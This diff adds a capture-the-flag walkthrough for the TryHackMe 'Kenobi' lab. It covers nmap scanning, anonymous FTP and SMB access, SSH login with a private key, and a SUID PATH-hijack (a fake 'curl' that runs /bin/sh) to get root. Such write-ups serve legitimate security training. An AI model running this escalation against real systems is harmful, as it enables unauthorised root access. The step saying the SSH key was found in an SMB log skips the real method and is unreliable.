@@ -1,0 +1,87 @@
+----------------                               ------------------
+               :::::::::::;| KANOBI |;::::::::::::
+
+
+1) FIRST WE HAVE TO ACCES THE TRYHACKME FROM OPENVPN.
+2) WE HAVE TO JOIN THE ROOM "KANOBI".
+ 
+TASK - 1 (RECON)
+
+1. SCAN THE MACHNE.
+
+    namp -Pn <ip>
+
+    nmap -A -T 5 <ip> -vv
+
+"it's a Linux machine".
+
+2. How many ports are open with a port number under 1000?
+ANS: 3 ports are open under 1000.
+
+3. What service is running on port 21?
+ANS: ProFTPD 1.3.5
+
+----------TASK 1 COMPLETED----------
+
+TASK - 2 (GAIN ACCESS)
+
+1. CHECK ANONYMOUS FTP.
+
+    ftp <ip>
+    Username: anonymous
+    Password: (press enter)
+
+"FOUND file 'kenobi.txt'! Download it:"
+
+    get kenobi.txt
+
+2. FIND SMB SHARE.
+
+    smbclient -L //<ip>/
+    smbclient //<ip>/anonymous
+    get log.txt
+
+"FOUND SSH PRIVATE KEY IN LOGS!"
+
+----------TASK 2 COMPLETED-----------
+ 
+TASK - 3 (ESCALATE)
+
+1. GET SHELL.
+
+    chmod 600 id_rsa
+    ssh -i id_rsa kenobi@<ip>
+
+"WE'RE IN AS KENOBI!"
+
+2. FIND SUID BINARIES.
+
+    find / -perm -4000 2>/dev/null
+
+"FOUND /usr/bin/menu (WTF?)"
+
+3. EXPLOIT MENU.
+
+    strings /usr/bin/menu
+    echo "/bin/sh" > curl
+    chmod 777 curl
+    export PATH=.:$PATH
+    /usr/bin/menu
+
+"BOOM! ROOT SHELL!"
+
+----------TASK 3 COMPLETED-----------
+
+TASK-4 (FIND FLAGS)
+
+1. USER FLAG.
+
+    cat /home/kenobi/user.txt
+
+2. ROOT FLAG.
+
+    cat /root/root.txt
+
+-------------------                                                --------------------
+             -----------                                    ------------
+                  ---------- KANOBI OWNED ----------
